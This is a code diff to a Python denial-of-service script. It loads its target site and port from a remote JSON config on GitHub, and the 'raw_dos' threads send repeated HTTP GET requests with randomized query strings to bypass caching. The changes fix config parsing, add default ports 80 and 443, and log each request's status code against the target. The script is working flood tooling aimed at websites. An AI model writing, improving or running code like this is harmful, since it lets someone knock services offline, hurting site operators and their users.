@@ -20,9 +20,7 @@ from scapy.all import *
 from random import randint
 
 cfg = requests.get("https://raw.githubusercontent.com/HotDrify/hikka.modules/main/assets/config.json")
-
-with cfg.text as f:
-    config = json.load(f)
+config = json.loads(cfg.text)
 
 urllib3.disable_warnings()
 urllib3.PoolManager()
@@ -164,7 +162,15 @@ def start_url():
 def start_port():
     global port
     port = config["port"]
-    
+    if port == '':
+        if "https" in url:
+                port = int(443)
+        else:
+            port = int(80)
+    else:
+        port = int(port)
+
+
 def start_mode():
     global choice_mode, filenam1, filenam2, method_
     choice_mode = str(4)
@@ -223,7 +229,7 @@ class raw_dos(threading.Thread):
                         r = requests.get(url, headers=headersx)
                     else:
                         r = requests.get(url+ "/?=" +str(random.randint(0,20000)), headers=headersx)
-                    print(r.status_code)
+                    print(f"{config['site']}:{config['port']} | {r.status_code}")
             except Exception as err:
                 print(err)
 if __name__ == '__main__':
